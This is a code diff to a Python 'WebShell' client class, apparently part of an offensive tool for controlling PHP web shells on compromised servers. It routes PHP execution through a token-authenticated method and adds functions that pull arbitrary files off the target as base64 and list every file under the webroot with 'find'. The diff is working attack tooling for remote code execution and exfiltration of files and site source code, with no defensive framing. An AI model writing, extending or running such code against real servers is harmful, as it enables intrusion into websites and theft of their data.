@@ -69,7 +69,7 @@ class WebShell():
 
     def read_file(self, filepath):
         Log.info("Reading file : [%s] ..." % (filepath))
-        result = self.php_code_exec("echo file_get_contents('%s');" % filepath)
+        result = self.php_code_exec_token("echo file_get_contents('%s');" % filepath)
         if result[0]:
             Log.success("Content : \n%s" % (result[1]))
         else:
@@ -337,7 +337,7 @@ class WebShell():
         return self.auto_exec("which %s" % (binary))
 
     def check_function_exist(self, function_name):
-        result = self.php_code_exec('var_dump(function_exists(%s));' % (function_name))
+        result = self.php_code_exec_token('var_dump(function_exists(%s));' % (function_name))
         if result[0]:
             content = result[1]
             if "bool(true)" in content:
@@ -349,3 +349,32 @@ class WebShell():
         else:
             Log.error("Some error occured when exec php code...")
             return False
+
+    def download(self, path, local_path):
+        Log.info("Downloading file : %s" % path)
+        result = self.php_code_exec_token('echo base64_encode(file_get_contents("%s"));' % (path))
+        if result[0]:
+            Log.success("Fetch data success! Start saving...")
+            content = result[1]
+            with open(local_path, "wb") as f:
+                Log.info("Saving...")
+                f.write(content.decode("base64"))
+            Log.info("Download finished!")
+        else:
+            Log.error("Fetch data failed!")
+
+    def download_code(self):
+        Log.info("Listing all files...")
+        result = self.auto_exec('find %s' % (self.webroot))
+        if result[0]:
+            Log.success("Listing files success!")
+            content = result[1].split("\n")
+            Log.info("Print some of the files...")
+            for file in content[0:10]:
+                Log.success("Found : " + file)
+        else:
+            Log.error("Listing files error!")
+
+
+
+
